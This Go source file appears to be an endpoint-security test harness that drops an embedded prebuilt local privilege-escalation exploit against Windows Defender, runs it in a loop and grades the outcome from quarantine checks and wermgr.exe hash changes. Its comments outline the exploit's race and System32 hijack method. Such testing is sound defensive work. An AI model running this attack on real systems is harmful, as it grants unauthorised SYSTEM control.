// RoguePlanet — Windows Defender Remediation TOCTOU LPE (wermgr.exe SYSTEM hijack)
// F0RT1KA Security Testing Framework
//
// PREBUILT-BINARY DEPLOYMENT TEST.
//
// This orchestrator does NOT reimplement the RoguePlanet exploit. It embeds the
// prebuilt, signed RoguePlanet.exe (gzip-compressed), drops it to LOG_DIR, and
// detonates it in a NON-ELEVATED interactive user context, then classifies the
// outcome strictly on positive evidence (CLAUDE.md Bug Prevention Rule 8).
//
// The exploit is a TOCTOU/junction/oplock race against Windows Defender's
// SYSTEM-privileged remediation ("clean") path. On success, a SYSTEM write lands
// attacker bytes at C:\Windows\System32\wermgr.exe and the built-in WER scheduled
// task (\Microsoft\Windows\Windows Error Reporting\QueueReporting) executes it as
// SYSTEM, yielding an interactive NT AUTHORITY\SYSTEM console. The upstream-modified
// binary self-restores System32\wermgr.exe after ~30s (leaving wermgr.exe.rp_old
// until reboot). The race is "hit or miss" — this orchestrator loops it.
//
// Source behavior spec: ROGUEPLANET_ANALYSIS.md (RoguePlanet PoC by "Nightmare-Eclipse").

//go:build windows

/*
ID: aa764293-94ed-4b25-a7fb-7d6fc14ac9a4
NAME: RoguePlanet — Windows Defender Remediation TOCTOU LPE (wermgr.exe SYSTEM hijack)
TECHNIQUES: T1068, T1036.005, T1053.005
TACTICS: privilege-escalation, defense-evasion, execution
SEVERITY: critical
TARGET: windows-endpoint
COMPLEXITY: high
THREAT_ACTOR: N/A
SUBCATEGORY: apt
TAGS: defender-bypass, toctou, junction, oplock, lpe, wermgr, vss, privilege-escalation
SOURCE_URL: N/A
UNIT: response
CREATED: 2026-06-09
AUTHOR: sectest-builder
*/

package main

import (
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/hex"
	_ "embed"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"time"

	"github.com/google/uuid"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

// ==============================================================================
// CONFIGURATION
// ==============================================================================

const (
	TEST_UUID = "aa764293-94ed-4b25-a7fb-7d6fc14ac9a4"
	TEST_NAME = "RoguePlanet — Windows Defender Remediation TOCTOU LPE (wermgr.exe SYSTEM hijack)"

	// The dropped payload name in LOG_DIR.
	PAYLOAD_NAME   = "RoguePlanet.exe"
	OUTPUT_NAME    = "RoguePlanet_output.txt" // per Bug Prevention Rule 5
	WERMGR_PATH    = `C:\Windows\System32\wermgr.exe`
	SUCCESS_MARKER = "Exploit succeeded." // literal printed by RoguePlanet on the success path

	// Bounded retry budget for the "hit or miss" race (COMPLEXITY=high).
	// Justified in the info card: cap by BOTH attempt count AND wall-clock.
	MAX_ATTEMPTS   = 5
	OVERALL_BUDGET = 5 * time.Minute

	// During each attempt, poll wermgr.exe's hash on a short interval to catch the
	// transient success window before the ~30s self-restore reverts it.
	WERMGR_POLL_INTERVAL = 750 * time.Millisecond
)

// Embed the gzip-compressed, F0RT1KA-signed prebuilt RoguePlanet.exe.
// Decompressed in memory at runtime; the file written to disk is a normal signed PE.
// Build pipeline (build_all.sh): sign RoguePlanet.exe -> gzip -9 -> embed -> sign orchestrator.
//
//go:embed RoguePlanet.exe.gz
var roguePlanetCompressed []byte

// ==============================================================================
// RESULT CLASSIFICATION STATE
// ==============================================================================

// classification is the orchestrator's verdict, mapped to an Endpoint exit code in
// determineExitCode(). It is set ONLY on positive evidence (Bug Prevention Rule 8).
type classification int

const (
	clsInconclusive classification = iota // -> 999 (lost race OR prerequisite not met). DEFAULT.
	clsUnprotected                        // -> 101 (exploit succeeded: marker + wermgr hash change)
	clsExecPrevented                      // -> 126 (execution prevented on a written binary)
	clsQuarantined                        // -> 105 (dropped binary quarantined on extraction)
)

// runState accumulates evidence across the retry loop. Benign counters (attempts)
// are tracked separately from protection/critical evidence (Bug Prevention Rule 4).
type runState struct {
	verdict classification

	// benign progress counters (do NOT influence the exit code on their own)
	attempts      int
	launchesOK    int // payload actually started in a user context at least this many times
	successMarker bool

	// critical evidence
	baselineWermgrHash string
	observedWermgrHash string // a hash observed DIFFERENT from baseline during a run
	wermgrChanged      bool
	wermgrRestored     bool // confirmed restored to baseline after the run (cleanup health)

	reason string
}

// ==============================================================================
// MAIN
// ==============================================================================

func main() {
	metadata := TestMetadata{
		Version:       "1.0.0",
		Category:      "privilege_escalation",
		Severity:      "critical",
		Techniques:    []string{"T1068", "T1036.005", "T1053.005"},
		Tactics:       []string{"privilege-escalation", "defense-evasion", "execution"},
		Score:         8.7,
		RubricVersion: "v2.1",
		ScoreBreakdown: &ScoreBreakdown{
			RealWorldAccuracy:       3.0,
			TechnicalSophistication: 3.0,
			SafetyMechanisms:        1.5,
			DetectionOpportunities:  0.5,
			LoggingObservability:    1.0,
		},
		Tags: []string{"defender-bypass", "toctou", "junction", "oplock", "lpe", "wermgr", "vss", "privilege-escalation"},
	}

	orgInfo := ResolveOrganization("")

	executionContext := ExecutionContext{
		ExecutionID:    uuid.New().String(),
		Organization:   orgInfo.UUID,
		Environment:    "lab",
		DeploymentType: "manual",
		Configuration: &ExecutionConfiguration{
			TimeoutMs:         int(OVERALL_BUDGET.Milliseconds()),
			MultiStageEnabled: false,
		},
	}

	InitLogger(TEST_UUID, TEST_NAME, metadata, executionContext)

	defer func() {
		if r := recover(); r != nil {
			LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
			SaveLog(Endpoint.UnexpectedTestError, fmt.Sprintf("Test panic: %v", r))
			Endpoint.Stop(Endpoint.UnexpectedTestError)
		}
	}()

	Endpoint.Say("=================================================================")
	Endpoint.Say("F0RT1KA Test: %s", TEST_NAME)
	Endpoint.Say("Test UUID: %s", TEST_UUID)
	Endpoint.Say("=================================================================")
	Endpoint.Say("")
	Endpoint.Say("[!] This test performs a REAL Defender LPE detonation in a VM.")
	Endpoint.Say("[!] It overwrites C:\\Windows\\System32\\wermgr.exe and spawns a SYSTEM console.")
	Endpoint.Say("[!] Run ONLY on a disposable/snapshot Windows VM with Defender enabled.")
	Endpoint.Say("")

	state := &runState{verdict: clsInconclusive}

	// ----- Phase 0: prerequisites -----
	LogPhaseStart(0, "Prerequisite Validation")
	if code, ok := validatePrerequisites(state); !ok {
		LogPhaseEnd(0, "error", state.reason)
		Endpoint.Say("[x] Prerequisite not met: %s", state.reason)
		SaveLog(code, state.reason)
		Endpoint.Stop(code)
		return
	}
	LogPhaseEnd(0, "success", "Prerequisites satisfied")

	// ----- Phase 1: baseline System32\wermgr.exe hash (BEFORE detonation) -----
	LogPhaseStart(1, "Baseline wermgr.exe Hash")
	baseline, err := hashFile(WERMGR_PATH)
	if err != nil {
		// We cannot establish the integrity-change signal without a baseline.
		// Absence of a baseline is a prerequisite failure, NOT a block. -> 999.
		state.reason = fmt.Sprintf("could not read baseline %s: %v", WERMGR_PATH, err)
		LogPhaseEnd(1, "error", state.reason)
		Endpoint.Say("[x] %s", state.reason)
		SaveLog(Endpoint.UnexpectedTestError, state.reason)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
		return
	}
	state.baselineWermgrHash = baseline
	LogMessage("INFO", "Baseline", fmt.Sprintf("Baseline %s SHA256 = %s", WERMGR_PATH, baseline))
	Endpoint.Say("[*] Baseline wermgr.exe SHA256: %s", baseline)
	LogPhaseEnd(1, "success", "Baseline hash captured")

	// ----- Phase 2: drop the embedded payload (with quarantine-on-extraction check) -----
	LogPhaseStart(2, "Payload Extraction")
	payloadPath := filepath.Join(LOG_DIR, PAYLOAD_NAME)
	if code, ok := dropPayload(state, payloadPath); !ok {
		LogPhaseEnd(2, "blocked", state.reason)
		Endpoint.Say("[x] %s", state.reason)
		SaveLog(code, state.reason)
		Endpoint.Stop(code)
		return
	}
	LogPhaseEnd(2, "success", "Payload dropped to LOG_DIR")
	Endpoint.Say("[*] Payload dropped: %s", payloadPath)

	// ----- Phase 3: bounded detonation loop (the "hit or miss" race) -----
	LogPhaseStart(3, "Detonation (bounded race loop)")
	runDetonationLoop(state, payloadPath)
	LogPhaseEnd(3, "success", fmt.Sprintf("Loop finished after %d attempt(s); verdict=%d", state.attempts, state.verdict))

	// ----- Phase 4: cleanup + integrity verification -----
	LogPhaseStart(4, "Cleanup & Integrity Verification")
	verifyAndCleanup(state, payloadPath)
	LogPhaseEnd(4, "success", "Cleanup complete")

	// ----- Final classification -----
	exitCode, reason := determineExitCode(state)
	emitVerdict(state, exitCode, reason)
	SaveLog(exitCode, reason)
	Endpoint.Stop(exitCode)
}

// ==============================================================================
// PHASE 0 — PREREQUISITES
// ==============================================================================

// validatePrerequisites enforces the non-elevated-interactive-user requirement and
// the Defender-enabled requirement. Returns (exitCode, ok). On not-ok, exitCode is
// always 999 (prerequisite not met) — NEVER a block code.
func validatePrerequisites(state *runState) (int, bool) {
	// Defender must be ON — it IS the target. If it's off, the exploit's clean path
	// never runs; that is a missing prerequisite, not protection.
	if !isDefenderRunning() {
		state.reason = "Windows Defender real-time protection is not running; cannot exercise the remediation race (prerequisite not met)"
		return Endpoint.UnexpectedTestError, false
	}
	Endpoint.Say("[*] Windows Defender is running (required target).")

	// Server SKU / ISO-mount limitation: a standard user cannot mount an ISO on
	// Server, which the PoC requires. Detect and bail with a clear prereq message.
	if isServerSKU() {
		state.reason = "host appears to be a Windows Server SKU; standard users cannot mount ISOs, so RoguePlanet cannot run (prerequisite not met)"
		return Endpoint.UnexpectedTestError, false
	}

	// Execution-context requirement: the payload MUST run as a medium-IL interactive
	// user. If we are SYSTEM, we need an active console session token to drop into.
	if isSystemContext() {
		Endpoint.Say("[*] Orchestrator is running as SYSTEM — will drop payload into the active console session.")
		LogMessage("INFO", "Context", "SYSTEM context detected; CreateProcessAsUser launch path selected")
		ok, why := activeConsoleSessionAvailable()
		if !ok {
			state.reason = fmt.Sprintf("running as SYSTEM but %s; cannot satisfy non-elevated interactive-user requirement (prerequisite not met)", why)
			return Endpoint.UnexpectedTestError, false
		}
		Endpoint.Say("[*] Active interactive console session is available for the user-token launch.")
	} else {
		Endpoint.Say("[*] Orchestrator is running as a normal user — direct launch path selected.")
		LogMessage("INFO", "Context", "Non-SYSTEM context detected; direct launch path selected")
	}

	return 0, true
}

// ==============================================================================
// PHASE 2 — PAYLOAD DROP
// ==============================================================================

// dropPayload decompresses the embedded RoguePlanet.exe.gz, writes it to LOG_DIR,
// and checks for quarantine-on-extraction. Returns (exitCode, ok). The only block
// code it may return is 105 (quarantine), and ONLY on positive os.Stat evidence
// (Bug Prevention Rule 3).
func dropPayload(state *runState, payloadPath string) (int, bool) {
	if err := os.MkdirAll(LOG_DIR, 0o755); err != nil {
		state.reason = fmt.Sprintf("could not create LOG_DIR %s: %v", LOG_DIR, err)
		return Endpoint.UnexpectedTestError, false
	}

	binaryData, err := decompressGzip(roguePlanetCompressed)
	if err != nil {
		state.reason = fmt.Sprintf("could not decompress embedded payload: %v", err)
		return Endpoint.UnexpectedTestError, false
	}

	if err := os.WriteFile(payloadPath, binaryData, 0o755); err != nil {
		// A write failure here is benign/ambiguous (locked dir, etc.), NOT a block. -> 999.
		state.reason = fmt.Sprintf("could not write payload to %s: %v", payloadPath, err)
		return Endpoint.UnexpectedTestError, false
	}
	LogFileDropped(PAYLOAD_NAME, payloadPath, int64(len(binaryData)), false)

	// Quarantine-on-extraction detection per Bug Prevention Rule 3:
	// sleep, then os.Stat. If the file vanished, AV removed it => positive evidence => 105.
	time.Sleep(3 * time.Second)
	if _, statErr := os.Stat(payloadPath); os.IsNotExist(statErr) {
		state.verdict = clsQuarantined
		state.reason = "dropped RoguePlanet.exe was removed from LOG_DIR within 3s of extraction (quarantine-on-extraction confirmed via os.Stat)"
		LogFileDropped(PAYLOAD_NAME, payloadPath, int64(len(binaryData)), true)
		LogMessage("SUCCESS", "Extraction", state.reason)
		return Endpoint.FileQuarantinedOnExtraction, false
	}

	return 0, true
}

// ==============================================================================
// PHASE 3 — DETONATION LOOP
// ==============================================================================

// runDetonationLoop runs RoguePlanet.exe repeatedly until a confirmed success (101),
// a confirmed block (105/126), or the attempt/time budget is exhausted (-> 999).
func runDetonationLoop(state *runState, payloadPath string) {
	deadline := time.Now().Add(OVERALL_BUDGET)

	for state.attempts < MAX_ATTEMPTS && time.Now().Before(deadline) {
		state.attempts++
		Endpoint.Say("")
		Endpoint.Say("--- Detonation attempt %d/%d ---", state.attempts, MAX_ATTEMPTS)
		LogMessage("INFO", "Detonation", fmt.Sprintf("Attempt %d/%d starting", state.attempts, MAX_ATTEMPTS))

		res := detonateOnce(state, payloadPath, deadline)

		// Re-confirm the file still exists between attempts; a mid-run quarantine is
		// positive block evidence (105) just like extraction-time quarantine.
		if _, statErr := os.Stat(payloadPath); os.IsNotExist(statErr) {
			state.verdict = clsQuarantined
			state.reason = fmt.Sprintf("RoguePlanet.exe disappeared from LOG_DIR during attempt %d (quarantine confirmed via os.Stat)", state.attempts)
			LogMessage("SUCCESS", "Detonation", state.reason)
			return
		}

		switch res {
		case clsUnprotected:
			// Success requires BOTH: marker AND observed wermgr hash change.
			state.verdict = clsUnprotected
			state.reason = fmt.Sprintf("EXPLOIT SUCCEEDED on attempt %d: success marker observed AND System32\\wermgr.exe hash changed from baseline", state.attempts)
			LogMessage("SUCCESS", "Detonation", state.reason)
			return
		case clsExecPrevented:
			state.verdict = clsExecPrevented
			// reason already set by detonateOnce via state.reason
			LogMessage("SUCCESS", "Detonation", state.reason)
			return
		default:
			// Inconclusive this round (lost race / no positive evidence). Keep looping.
			LogMessage("INFO", "Detonation", fmt.Sprintf("Attempt %d inconclusive (no positive success/block evidence); continuing", state.attempts))
		}
	}

	// Budget exhausted with no positive verdict.
	if state.verdict == clsInconclusive {
		if state.launchesOK == 0 {
			state.reason = fmt.Sprintf("payload never launched successfully in a user context across %d attempt(s); inconclusive (no positive block evidence)", state.attempts)
		} else {
			state.reason = fmt.Sprintf("race lost across %d attempt(s) within budget; no success marker and no positive block evidence (a lost race is NOT a block)", state.attempts)
		}
	}
}

// detonateOnce launches the payload once (via the correct context-aware launcher),
// captures stdout/stderr to LOG_DIR, polls wermgr.exe for an integrity change during
// the run, and returns a per-attempt classification.
//
// IMPORTANT (Rule 8): this function returns clsExecPrevented ONLY on an OS-emitted
// execution-prevention signal on a binary that was successfully written. A benign
// launch failure (token error, etc.) returns clsInconclusive, never a block.
func detonateOnce(state *runState, payloadPath string, deadline time.Time) classification {
	outputPath := filepath.Join(LOG_DIR, OUTPUT_NAME)

	// launchPayload starts the process in a non-elevated user context, tees its
	// stdout/stderr to console+file (Rule 5), and returns a handle to wait on plus a
	// live accessor for captured output. The hash-polling runs concurrently.
	proc, err := launchPayload(payloadPath, outputPath)
	if err != nil {
		// Distinguish OS execution-prevention from benign launch failure.
		if isExecutionPrevented(err) {
			state.reason = fmt.Sprintf("OS reported execution prevented for %s on attempt %d: %v", PAYLOAD_NAME, state.attempts, err)
			return clsExecPrevented
		}
		// Benign / ambiguous launch failure -> inconclusive (NEVER a block). Rule 8.
		LogMessage("WARN", "Detonation", fmt.Sprintf("launch failed (benign/ambiguous, treated as inconclusive): %v", err))
		return clsInconclusive
	}
	state.launchesOK++
	LogProcessExecution(PAYLOAD_NAME, payloadPath, proc.pid, true, 0, "")

	// Concurrently poll wermgr.exe for the transient success-window hash change,
	// while the payload runs. Capture ANY deviation from baseline (do NOT rely on the
	// post-restore hash).
	pollDone := make(chan struct{})
	go func() {
		defer close(pollDone)
		for {
			select {
			case <-proc.done:
				return
			default:
			}
			if time.Now().After(deadline) {
				return
			}
			if h, herr := hashFile(WERMGR_PATH); herr == nil {
				if h != state.baselineWermgrHash && !state.wermgrChanged {
					state.wermgrChanged = true
					state.observedWermgrHash = h
					LogMessage("CRITICAL", "Integrity",
						fmt.Sprintf("System32\\wermgr.exe hash deviated from baseline during run: %s (baseline %s)", h, state.baselineWermgrHash))
					Endpoint.Say("    [!] wermgr.exe integrity change observed: %s", h)
				}
			}
			time.Sleep(WERMGR_POLL_INTERVAL)
		}
	}()

	// Wait for the payload to finish (bounded by deadline inside launchPayload's waiter).
	proc.wait()
	<-pollDone

	// Read captured output and look for the literal success marker.
	if out, rerr := os.ReadFile(outputPath); rerr == nil {
		if bytes.Contains(out, []byte(SUCCESS_MARKER)) {
			state.successMarker = true
			LogMessage("CRITICAL", "Detonation", fmt.Sprintf("Captured output contains success marker %q", SUCCESS_MARKER))
			Endpoint.Say("    [!] Success marker observed in payload output.")
		}
	}

	// Per-attempt verdict: 101 requires BOTH success marker AND wermgr hash change.
	if state.successMarker && state.wermgrChanged {
		return clsUnprotected
	}
	return clsInconclusive
}

// ==============================================================================
// PHASE 4 — CLEANUP & INTEGRITY VERIFICATION
// ==============================================================================

// verifyAndCleanup confirms wermgr.exe was restored, warns if it was not (so an
// operator can restore from %TEMP%\RP_wbk_* per analysis §10), notes the leftover
// .rp_old and spawned SYSTEM console, and removes the dropped payload + output.
func verifyAndCleanup(state *runState, payloadPath string) {
	// Integrity verification: is wermgr.exe back to its baseline bytes?
	if h, err := hashFile(WERMGR_PATH); err == nil {
		if h == state.baselineWermgrHash {
			state.wermgrRestored = true
			LogMessage("INFO", "Integrity", "System32\\wermgr.exe matches baseline (self-restore confirmed)")
			Endpoint.Say("[*] wermgr.exe restored to baseline (self-restore OK).")
		} else {
			state.wermgrRestored = false
			LogMessage("CRITICAL", "Integrity",
				fmt.Sprintf("System32\\wermgr.exe does NOT match baseline after run (current %s, baseline %s). MANUAL RESTORE may be required from %%TEMP%%\\RP_wbk_* — see analysis §10.", h, state.baselineWermgrHash))
			Endpoint.Say("[!] WARNING: wermgr.exe NOT restored to baseline. Manual restore from %%TEMP%%\\RP_wbk_* may be required (needs elevation).")
		}
	} else {
		LogMessage("WARN", "Integrity", fmt.Sprintf("could not re-hash %s during cleanup: %v", WERMGR_PATH, err))
	}

	// Note residual artifacts that are intentionally NOT cleaned.
	if state.wermgrChanged {
		LogMessage("WARN", "Cleanup",
			"A SYSTEM console may have been spawned (persists; out of scope to kill) and System32\\wermgr.exe.rp_old may remain until reboot — see analysis §10.")
		Endpoint.Say("[*] Note: a SYSTEM console may persist; wermgr.exe.rp_old may remain until reboot.")
	}

	// Remove the dropped payload + captured output where possible.
	for _, p := range []string{payloadPath, filepath.Join(LOG_DIR, OUTPUT_NAME)} {
		if err := os.Remove(p); err == nil {
			LogMessage("INFO", "Cleanup", fmt.Sprintf("removed %s", p))
		}
	}
}

// ==============================================================================
// FINAL CLASSIFICATION — determineExitCode (NEVER hardcodes; evaluates evidence)
// ==============================================================================

// determineExitCode maps accumulated evidence to an Endpoint exit code.
//
// Decision tree (Bug Prevention Rule 8 — block codes ONLY on positive evidence):
//
//	clsUnprotected   -> 101  : success marker AND wermgr.exe hash changed from baseline
//	clsQuarantined   -> 105  : dropped/dropping payload removed by AV (os.Stat positive)
//	clsExecPrevented -> 126  : OS-emitted execution-prevention on a written binary
//	clsInconclusive  -> 999  : lost race OR prerequisite gap (DEFAULT — never a block)
//
// There is intentionally NO `default: return <block>` — the zero value is 999.
func determineExitCode(state *runState) (int, string) {
	switch state.verdict {
	case clsUnprotected:
		return Endpoint.Unprotected, state.reason
	case clsQuarantined:
		return Endpoint.FileQuarantinedOnExtraction, state.reason
	case clsExecPrevented:
		return Endpoint.ExecutionPrevented, state.reason
	default:
		// clsInconclusive: lost race or unmet prerequisite. NOT a block.
		if state.reason == "" {
			state.reason = "inconclusive: no positive success or block evidence gathered"
		}
		return Endpoint.UnexpectedTestError, state.reason
	}
}

func emitVerdict(state *runState, exitCode int, reason string) {
	Endpoint.Say("")
	Endpoint.Say("=================================================================")
	Endpoint.Say("FINAL EVALUATION")
	Endpoint.Say("=================================================================")
	switch exitCode {
	case Endpoint.Unprotected:
		Endpoint.Say("RESULT: UNPROTECTED (exit 101)")
		Endpoint.Say("  The Defender remediation race SUCCEEDED — SYSTEM-level wermgr.exe hijack landed.")
	case Endpoint.FileQuarantinedOnExtraction:
		Endpoint.Say("RESULT: PROTECTED — quarantined on extraction (exit 105)")
		Endpoint.Say("  AV/EDR removed the dropped RoguePlanet.exe before/at detonation.")
	case Endpoint.ExecutionPrevented:
		Endpoint.Say("RESULT: PROTECTED — execution prevented (exit 126)")
		Endpoint.Say("  AV/EDR blocked execution of the written RoguePlanet.exe.")
	default:
		Endpoint.Say("RESULT: INCONCLUSIVE (exit 999)")
		Endpoint.Say("  No success markers and no positive block evidence (a lost race is NOT a block).")
	}
	Endpoint.Say("  Reason: %s", reason)
	Endpoint.Say("  Attempts: %d | Launches OK: %d | Success marker: %v | wermgr changed: %v | wermgr restored: %v",
		state.attempts, state.launchesOK, state.successMarker, state.wermgrChanged, state.wermgrRestored)
	Endpoint.Say("=================================================================")
}

// ==============================================================================
// SHARED HELPERS
// ==============================================================================

func decompressGzip(compressed []byte) ([]byte, error) {
	reader, err := gzip.NewReader(bytes.NewReader(compressed))
	if err != nil {
		return nil, fmt.Errorf("create gzip reader: %v", err)
	}
	defer reader.Close()
	out, err := io.ReadAll(reader)
	if err != nil {
		return nil, fmt.Errorf("read gzip stream: %v", err)
	}
	return out, nil
}

func hashFile(path string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}
	return hex.EncodeToString(h.Sum(nil)), nil
}
